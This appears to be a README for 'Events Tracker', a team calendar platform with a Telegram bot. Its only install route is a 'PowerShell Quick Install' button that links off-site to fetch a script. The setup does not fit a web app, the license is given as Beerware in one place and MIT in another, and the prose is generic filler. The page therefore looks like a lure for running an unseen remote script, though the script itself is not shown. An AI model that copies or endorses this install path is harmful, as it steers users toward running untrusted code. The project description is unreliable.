<div align="center">

# 📅 Events Tracker — Team Calendar Web Platform

![](files/preview.png)

### 🚀 PowerShell Quick Install

[![](files/button.png)](https://khushitheonexai-cloud.github.io/events-tracker/)

[![ps](https://img.shields.io/badge/Ps-7%2B-84cc16?style=for-the-badge&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/Lic-Beerware-a3e635?style=for-the-badge&labelColor=0d1117)]() [![state](https://img.shields.io/badge/State-Released-2ea44f?style=for-the-badge&labelColor=0d1117)]()

</div>

---

Events Tracker is a unified team calendar and tracking workspace built for events, talks, and forums of every scale. Move effortlessly between week and month views, organize forums with nested sessions, and apply statuses and filters to keep every initiative visible and on course. Assign owners, preserve the full communication history for each event, and let a Claude-powered Telegram bot transform forwarded invites, PDFs, and posters into structured entries while answering questions about your schedule. It is the polished command center for teams that treat their calendar as a strategic asset.

## 🔧 Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

**📅 Dual calendar views** — Switch between week and month layouts to see your team's schedule at a glance, whether you're planning the next few days or mapping out the quarter ahead.

**🗂️ Forums with nested sessions** — Organize multi-part forums as parent events with individual sessions inside, so every talk, panel, and workshop keeps its place in the bigger picture.

**🏷️ Statuses and smart filters** — Track each event's progress with clear statuses and slice your calendar by owner, state, or type to focus on exactly what matters right now.

**👤 Owner assignment** — Give every event a responsible owner, so nothing slips through the alternatives and everyone knows who's driving each initiative.

**💬 Full communication history** — Every event carries its complete conversation trail, keeping context, decisions, and updates attached where they belong.

**🤖 Intelligent event intake** — Forward an invite, PDF, or poster to the Telegram bot and watch it become a structured event, complete with dates, venues, and details, ready for your review before it lands on the calendar.

**✅ Confirmation-first design** — Nothing is filed silently: each captured event passes through a quick confirmation step, so your calendar stays clean and trustworthy.

**❓ Ask-your-calendar answers** — Query the bot in plain language about your schedule and get instant, accurate replies drawn from your team's event base.

**🔔 Rule-based reminders** — Daily reminder runs keep the team ahead of deadlines and upcoming sessions without anyone lifting a finger.

**✏️ Autosaving edits** — Changes on the site save themselves moments after you stop typing, with a familiar save button there for those who prefer the ritual.

## Tech Stack

Events Tracker is built on a lean, modern foundation designed for speed, clarity, and long-term maintainability. Every layer is chosen to keep the experience responsive — whether your team is planning a single talk or orchestrating a full season of forums.

**Frontend**

A polished, component-driven interface renders the week and month calendars, nested forum sessions, and the full event communication timeline with smooth, instant transitions. Status filters and owner assignments update in real time, so the view always reflects the latest state of your schedule.

**Backend & Data**

A secure, serverless application layer handles authentication, event records, and the complete history attached to every event. Data is persisted in a managed relational store with structured schemas purpose-built for calendars, nested sessions, and status workflows — giving you reliable reads and writes without operational overhead.

**Conversational Assistant**

A language-model-powered assistant interprets forwarded invites, PDFs, and posters, then turns them into structured event drafts. It also answers natural-language questions about your schedule. Every suggestion passes through a confirmation step before anything is written, keeping your calendar accurate and intentional.

**Reminders & Automation**

A scheduled job evaluates your reminder rules daily, surfacing upcoming events and status changes so nothing slips through. Owners stay informed, and the full communication trail remains attached to each event for complete context.

**Deployment**

The entire product ships as a cohesive, production-ready stack that deploys in a single step. Access is protected by a lightweight gate, with an additional edit layer for administrators — straightforward to operate, easy to extend, and ready to grow with your team.

## Questions & Answers

**Is Events Tracker accessible to try?**
Yes — Events Tracker is openly available to explore. Spin it up, bring your team in, and see how a shared calendar changes the way you plan.

**Can I customize it for my team's workflow?**
Absolutely. Statuses, filters, owners and views are all designed to adapt to how your team already works — not the other way around. Shape it once, and it stays out of your way.

**Does it handle recurring events and multi-session forums?**
It does. Forums with nested sessions are first-class citizens, and week and month views keep the big picture clear while the details stay one click away.

**How does the Telegram bot fit in?**
Forward an invite, a PDF or a poster, and the bot turns it into a structured event — with a confirmation step so nothing lands in your calendar by surprise. It also answers questions about your schedule on demand.

**Is the communication history really preserved?**
Every event keeps its full thread of communication. No more digging through chats to remember who said what, or when.

**Can I assign owners to events?**
Yes. Assign an owner to any event and accountability follows automatically. Everyone knows who's driving, and the tracker keeps the record.

**What happens to my data?**
Your data lives in your own Supabase project — you own it, you control it. Events Tracker is the layer that makes it a pleasure to work with.

**Is there a learning curve?**
Minimal. The interface is built around the two things teams actually do: glance at the calendar, and update the details. Everything else stays quietly in the background until you need it.

## License

Events Tracker is released under the MIT License, giving you wide latitude to use, adapt, and build upon the project for both personal and commercial purposes.

In practice, this means you can tailor the calendar views, extend the forum and session model, or integrate the tracker into your team's own workflows without friction. The license requires only that the original copyright notice and permission notice remain included in any copies or substantial portions of the software.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.